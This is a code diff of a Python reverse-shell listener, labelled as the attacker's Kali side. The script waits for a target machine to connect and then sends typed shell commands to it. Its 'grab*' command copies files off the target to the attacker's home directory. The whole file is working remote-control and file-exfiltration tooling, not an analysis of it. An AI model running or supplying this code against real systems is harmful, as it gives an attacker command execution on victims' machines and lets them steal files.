@@ -1,44 +1,42 @@
-#####################
-#Attacker side
-#Create listener (1)
-#Wait for script is executed from target side (2), then execute command (3)
-# (5) Read output command or file
 import socket
 
-####################
-# transfer : s
-# intput : conn socket object, command is command send to target
+#Kali side
+#open a port and received inbound, create listener
+
+#Function to transfert file
 def transfer(conn,command):
+	
+	#create file
+	grab, filenamee = command.split('*')
+	f=open('/home/kali/'+filenamee, 'wb')
+	#lauch grab*file command
 	conn.send(command.encode())
-	grab, path = command.split('*')
-	f=open('/home/kali/'+path, 'wb')
 	while True:
+		#bits =conn.recv(1024
 		bits =conn.recv(1024)
-		#Check if file done
+		print ('[1] Transfer in progress')
+		#check if file done
 		if bits.endswith('DONE'.encode()):
-			f.write(bits[:-4]) #remove DONE from file
+			f.write(bits[:-4]) #remove DONE it from file
 			f.close()
 			print ('[1] Transfer completed')
 			break
-		if 'File not found'.encode() in bits:
+		if 'no file exists'.encode() in bits:
 			print ('[2] Unable to found the file')
 			break
-		f.write(bits) #keep writing until we see done
+		f.write(bits) #keep writing until we don't see Done
 
-####################
-# connect : create connectivity with target
-# no intput 
 def connect():
     s = socket.socket()
-    #Listen local
-    s.bind(("192.168.0.1",8080))
-    #backlogsize one session, max connexion is one
+    #listen here
+    s.bind(("192.168.0.139",8080))
+    #backlogsize one session, maxime connexion
     s.listen(1)
-    #accepted inbound connexion, return object conn and target IP address
+    #accepted inbound connexion, return object con and targer address
     con , addr = s.accept()
     print ('[1] connexion from', addr)
 
-    #Wait for cmd input and send to target
+    #infinite loop to get our input cmd and send to target
     while True:
         command = input("Shell> ")
 
@@ -47,18 +45,19 @@ def connect():
             con.send('terminate'.encode()) #send cmd in bytes
             con.close() #close socket in our side
             break #quit the loop
-        #for file transfer
         elif 'grab' in command:
             transfer(con, command)
         else:
-            con.send(command.encode()) #send back the received cmd
-            print (con.recv(1024).decode()) #get 1 kilobyte of received data
-
-#####################
-#Execute in Attacker side (Kali)		
+			#SEND
+            con.send(command.encode()) #send the input cmd
+            #print (con.recv(1024).decode('unicode_escape').encode('utf-8')) 
+            #print (con.recv(4096).decode('unicode_escape').encode('utf-8')) 
+			#get 1 kilobyte of received data
+			#WAIT for answer
+            print (con.recv(1024).decode('iso8859-1')) 
+			
 def main():
     connect()
 
 main()
-
 
